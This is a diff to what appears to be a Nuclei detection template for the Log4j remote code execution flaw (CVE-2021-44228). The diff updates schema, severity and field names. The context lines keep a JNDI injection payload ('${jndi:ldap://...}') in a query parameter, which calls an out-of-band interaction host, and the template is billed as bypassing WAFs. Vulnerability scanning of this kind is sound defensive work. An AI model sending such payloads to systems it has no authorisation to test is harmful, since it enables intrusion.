@@ -1,10 +1,12 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: log4j-rce-detect-waf-bypass
 
 info:
   name: Apache Log4j RCE (CVE-2021-44228) Detection with WAF Bypass (CloudFlare etc.)
   author: toramanemre
+  severity: info
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?q=${jndi:ldap://{{interactsh-url}}/poc}"
@@ -25,7 +27,3 @@ requests:
         name: dns
         words:
           - "dns"
-
-
-
-
